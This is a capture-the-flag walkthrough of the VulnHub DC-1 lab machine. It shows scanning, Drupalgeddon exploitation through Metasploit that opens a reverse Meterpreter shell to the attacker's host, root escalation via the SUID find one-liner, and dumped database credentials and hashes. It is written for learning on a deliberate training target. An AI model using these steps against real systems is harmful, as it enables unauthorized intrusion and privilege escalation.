# BOX NAME: DC-1
**LINK**: https://www.vulnhub.com/entry/dc-1,292/

<details open><summary><ins>SUMMARY</ins></summary>

```
1. Pretty obvious this is a drupal site. There is a very good walkthrough of the drupalgeddon (7) exploit here https://www.youtube.com/watch?v=--DuAicB4pc
2. Use metasploit to get onto the box.
3. GTFO-bin on a SUID binary.
4. Find all 4 flags.

Great box. I learnt more about the drupalgeddon vuln thanks to the youtube video and researching some of the exploits.
No bruteforcing, password-reuse, webapp-authbypass necissary.
```
</details>

# REMOTE ENUMERATION:

<details><summary><ins>TARGET</ins></summary>

```
[+] IP:		10.77.0.61
[+] URL:	http://dc.local
```
</details>
<details><summary><ins>NMAP</ins></summary>

```
└─$ nmap -sV -sC $IP -oN nmap-dc1.log      
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-30 14:04 CEST
Nmap scan report for dc.local (10.77.0.61)
Host is up (0.00019s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 c4d659e6774c227a961660678b42488f (DSA)
|   2048 1182fe534edc5b327f446482757dd0a0 (RSA)
|_  256 3daa985c87afea84b823688db9055fd8 (ECDSA)
80/tcp  open  http    Apache httpd 2.2.22 ((Debian))
|_http-server-header: Apache/2.2.22 (Debian)
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to Drupal Site | Drupal Site
| http-robots.txt: 36 disallowed entries (15 shown)                                                                                 
| /includes/ /misc/ /modules/ /profiles/ /scripts/                                                                                  
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt                                                                                                    
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt                                                                                        
|_/LICENSE.txt /MAINTAINERS.txt                                                                                                                           
111/tcp open  rpcbind 2-4 (RPC #100000)                                                                                                                   
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          34313/tcp   status
|   100024  1          36832/udp   status
|   100024  1          42445/udp6  status
|_  100024  1          46022/tcp6  status
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.43 seconds
```
</details>
<details><summary><ins>WEB</ins></summary>

whatweb-scan

```
└─$ whatweb $URL --log-verbose=whatweb-dc1.log         
http://dc.local [200 OK] Apache[2.2.22], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Debian Linux][Apache/2.2.22 (Debian)], IP[10.77.0.61], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], PHP[5.4.45-0+deb7u14], PasswordField[pass], Script[text/javascript], Title[Welcome to Drupal Site | Drupal Site], UncommonHeaders[x-generator], X-Powered-By[PHP/5.4.45-0+deb7u14]
```

nikto-scan

```
└─$ nikto -h $URL | tee nikto-dc1.log
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.77.0.61
+ Target Hostname:    dc.local
+ Target Port:        80
+ Start Time:         2023-04-30 14:04:57 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Debian)
+ /: Retrieved x-powered-by header: PHP/5.4.45-0+deb7u14.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: Drupal 7 was identified via the x-generator header. See: https://www.drupal.org/project/remove_http_headers
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /robots.txt: Server may leak inodes via ETags, header found with file /robots.txt, inode: 152289, size: 1561, mtime: Wed Nov 20 21:45:59 2013. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /robots.txt: Entry '/INSTALL.sqlite.txt' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/LICENSE.txt' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/install.php' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/?q=user/password/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/user/login/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/user/password/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/INSTALL.pgsql.txt' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/UPGRADE.txt' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/user/register/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/?q=filter/tips/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file                                                                        
+ /robots.txt: Entry '/xmlrpc.php' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file                                                                             
+ /robots.txt: Entry '/MAINTAINERS.txt' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/INSTALL.mysql.txt' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/?q=user/login/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/?q=user/register/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/filter/tips/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: contains 36 entries which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /misc/favicon.ico: identifies this app/server as: Drupal 7.x. See: https://en.wikipedia.org/wiki/Favicon
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /: DEBUG HTTP verb may show server debugging information. See: https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-enable-debugging-for-aspnet-applications?view=vs-2017
+ /web.config: ASP config file is accessible.
+ /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /user/: This might be interesting.
+ /README: Uncommon header 'tcn' found, with contents: choice.
+ /README: README file found.
+ /UPGRADE.txt: Default file found.
+ /install.php: Drupal install.php file found. See: https://drupal.stackexchange.com/questions/269076/how-do-i-restrict-access-to-the-install-php-filehttps://drupal.stackexchange.com/questions/269076/how-do-i-restrict-access-to-the-install-php-file
+ /install.php: install.php file found.
+ /LICENSE.txt: License file found may identify site software.
+ /xmlrpc.php: xmlrpc.php was found.
+ /INSTALL.mysql.txt: Drupal installation file found. See: https://drupal.stackexchange.com/questions/269076/how-do-i-restrict-access-to-the-install-php-file
+ /INSTALL.pgsql.txt: Drupal installation file found. See: https://drupal.stackexchange.com/questions/269076/how-do-i-restrict-access-to-the-install-php-file
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ 9613 requests: 0 error(s) and 42 item(s) reported on remote host
+ End Time:           2023-04-30 14:20:32 (GMT2) (935 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

fuzzing

```

```
droope-scan & cmseek

``` 
┌──(jockemedlinux㉿jml)-[~/tools]
└─$ pip3 install droopescan  

└─$ ./droopescan --help                     
usage: droopescan (sub-commands ...) [options ...] {arguments ...}

    |
 ___| ___  ___  ___  ___  ___  ___  ___  ___  ___
|   )|   )|   )|   )|   )|___)|___ |    |   )|   )
|__/ |    |__/ |__/ |__/ |__   __/ |__  |__/||  /
                    |
=================================================

commands:

  scan
    cms scanning functionality.

  stats
    shows scanner status & capabilities.

options:
  -h, --help  show this help message and exit
  --debug     toggle debug output
  --quiet     suppress all output

Example invocations: 
  droopescan scan drupal -u URL_HERE
  droopescan scan silverstripe -u URL_HERE

More info: 
  droopescan scan --help
 
Please see the README file for information regarding proxies.
                                                                                                                                    
┌──(jockemedlinux㉿jml)-[~/tools/droopescan]
└─$ ./droopescan scan drupal -u http://dc.local
[+] Plugins found:                                                              
    ctools http://dc.local/sites/all/modules/ctools/                                                                                
        http://dc.local/sites/all/modules/ctools/LICENSE.txt                                                                                              
        http://dc.local/sites/all/modules/ctools/API.txt
    views http://dc.local/sites/all/modules/views/
        http://dc.local/sites/all/modules/views/README.txt
        http://dc.local/sites/all/modules/views/LICENSE.txt
    profile http://dc.local/modules/profile/
    php http://dc.local/modules/php/
    image http://dc.local/modules/image/

[+] Themes found:
    seven http://dc.local/themes/seven/
    garland http://dc.local/themes/garland/

[+] Possible version(s):
    7.22
    7.23
    7.24
    7.25
    7.26

[+] Possible interesting urls found:
    Default admin - http://dc.local/user/login

[+] Scan finished (0:07:05.122327 elapsed)
```
``` 
└─$ searchsploit drupal 7.0
------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                         |  Path
------------------------------------------------------------------------------------------------------- ---------------------------------
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)                                      | php/webapps/34992.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admin Session)                                       | php/webapps/44355.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (1)                            | php/webapps/34984.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (2)                            | php/webapps/34993.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Execution)                               | php/webapps/35150.php
Drupal < 7.34 - Denial of Service                                                                      | php/dos/35415.txt
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                               | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                               | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                            | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                    | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                       | php/webapps/44448.py
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)  | php/remote/46510.rb
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)  | php/remote/46510.rb
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution                                         | php/webapps/46452.txt
Drupal < 8.6.9 - REST Module Remote Code Execution              									   | php/webapps/46459.py

Damn.. Security in drupal be drippin.
```

```
 ___ _  _ ____ ____ ____ _  _
|    |\/| [__  |___ |___ |_/  by @r3dhax0r
|___ |  | ___| |___ |___ | \_ Version 1.1.3 K-RONA




 [+]  CMS Scan Results  [+] 

 ┏━Target: dc.local
 ┃
 ┠── CMS: Drupal
 ┃    │
 ┃    ├── Version: 7
 ┃    ╰── URL: https://drupal.org
 ┃
 ┠── Result: /home/jockemedlinux/GIT/writeups/VulnHUB/Result/dc.local/cms.json
 ┃
 ┗━Scan Completed in 0.14 Seconds, using 1 Requests

```

summary
```
So you either do it manually by viewing the video I provided or you use one of the two exploits in the repository.

So you either add an admin user, manipulate the site, upload a reverse shell and executes it on the site.

or you use the remote code execution on the page. Either with the php version (requires HTTPS) or a metasploit version. 
We will be using both. I recon we can add our admin user then leverage the metasploit version to get remote code execution. FUN!

┌──(jockemedlinux㉿jml)-[~/GIT/writeups/VulnHUB/dc1]
└─$ python2.7 drupal7-add-admin-user.py -t http://dc.local -u jml -p pwnu

Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)          | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)          | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)       | php/webapps/44542.tx

Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metas | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metas | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)  | php/webapps/44448.py

We'll be using the exploit(unix/webapp/drupal_drupalgeddon2) module.
Set the RHOST and bam.

msf6 exploit(unix/webapp/drupal_drupalgeddon2) > run
[*] Started reverse TCP handler on 10.77.0.35:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated.
[*] Sending stage (39927 bytes) to 10.77.0.61
[*] Meterpreter session 1 opened (10.77.0.35:4444 -> 10.77.0.61:44999) at 2023-04-30 14:59:36 +0200

meterpreter > 
meterpreter > sysinfo
Computer    : DC-1
OS          : Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686
Meterpreter : php/linux
```

</details>
<details><summary><ins>OTHER</ins></summary>

</details>


# LOCAL ENUMERATION:

<details><summary><ins>FILES OF INTEREST</ins></summary>

**FILES**:
```
/var/www/html/flag1.txt 					| flag1
/var/www/html/sites/default/settings.php 	| flag2
/var/lib/mysql-db							| flag3
/home/flag4/flag4 							| flag4
/root/thefinalflag.txt 						| final flag
```

**SUID's**:

```
/bin/mount
/bin/ping
/bin/su
/bin/ping6
/bin/umount
/usr/bin/at
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/procmail
/usr/bin/find 	<------
/usr/sbin/exim4
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/sbin/mount.nfs
```
**SGID's**:

```
/usr/bin/ssh-agent
/usr/bin/at
/usr/bin/mlocate
/usr/bin/lockfile
/usr/bin/chage
/usr/bin/bsd-write
/usr/bin/mutt_dotlock
/usr/bin/wall
/usr/bin/crontab
/usr/bin/expiry
/usr/bin/procmail
/usr/bin/dotlockfile
/usr/lib/utempter/utempter
/sbin/unix_chkpwd
```
**OTHERS**:

```

```
</details>

<details><summary><ins>USEFUL INFORMATION:</ins></summary>

**Kernel Info:**
*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*

```
/bin/bash: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26, BuildID[sha1]=0x2f0b46a7967b8b055b287b56c0024f131dc778c5, stripped
 

No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 7.11 (wheezy)
Release:        7.11
Codename:       wheezy


Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686 GNU/Linux

```
</details>

<details><summary><ins>CREDS:</ins></summary>

```
username:password

    array (
      'database' => 'drupaldb',
      'username' => 'dbuser',
      'password' => 'R0ck3t',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',

mysql -udbuser -pR0ck3t
```
```
+-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+---------
| uid | name  | pass                                                    | mail              | theme | signature | signature_format | created    | access     | login      | status | timezone            | language | picture | init    
+-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+---------
|   0 |       |                                                         |                   |       |           | NULL             |          0 |          0 |          0 |      0 | NULL                |          |       0 |         
|   1 | admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR | admin@example.com |       |           | NULL             | 1550581826 | 1550583852 | 1550582362 |      1 | Australia/Melbourne |          |       0 | admin@ex
|   2 | Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg | fred@example.org  |       |           | filtered_html    | 1550581952 | 1550582225 | 1550582225 |      1 | Australia/Melbourne |          |       0 | fred@exa
|   3 | jml   | $S$DXtOxgldeugkNEG5.zoa3/TW8J2K5WmcJk4LXuUnn2u3KQ9tUTJF |                   |       |           | NULL             |          0 | 1682858763 | 1682858763 |      1 | NULL                |          |       0 |         
+-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+---------
```

</details>

<details><summary><ins>HASHES:</ins></summary>

```

```
</details>

# Proofs

<details><summary><ins>Proofs</ins></summary>

Final payload:
```
www-data@DC-1:/var/www$ /usr/bin/find . -exec /bin/bash -p \; -quit
bash-4.2# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
bash-4.2# 
```

```
bash-4.2# cat /var/www/flag1.txt
Every good CMS needs a config file - and so do you
```

```
sites/default/settings.php
/**
 *
 * flag2
 * Brute force and dictionary attacks aren't the
 * only ways to gain access (and you WILL need access).
 * What can you do with these credentials?
 *
 */

```
```
found in mysql-db.
flag3 special perms will help find the passwd but you ll need to exec that command to work out how to get what s in the shadow  ',0); 
```
```
bash-4.2# cat flag4.txt /home/flag4/flag4.txt
Can you use this same method to find or access the flag in root?

Probably. But perhaps it's not that easy.  Or maybe it is?

```
```
bash-4.2# cat /root/thefinalflag.txt
Well done!!!!

Hopefully you've enjoyed this and learned some new skills.

You can let me know what you thought of this little journey
by contacting me via Twitter - @DCAU7
```

I think i skipped a couple steps since I got a root shell before looking for the flags.. woopsie.

</details>